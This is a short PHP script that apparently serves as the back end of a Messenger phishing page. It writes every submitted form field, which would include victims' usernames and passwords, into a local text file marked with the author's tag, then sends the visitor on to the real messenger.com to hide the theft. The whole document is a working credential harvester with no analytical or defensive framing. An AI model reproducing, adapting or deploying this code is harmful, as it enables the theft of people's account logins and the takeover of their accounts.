<?php
header ('Location: https://www.messenger.com/');
$handle = fopen("pyae.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
   fwrite($handle, "#by 😈Pyae Sone Hmoo😈#");
   
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
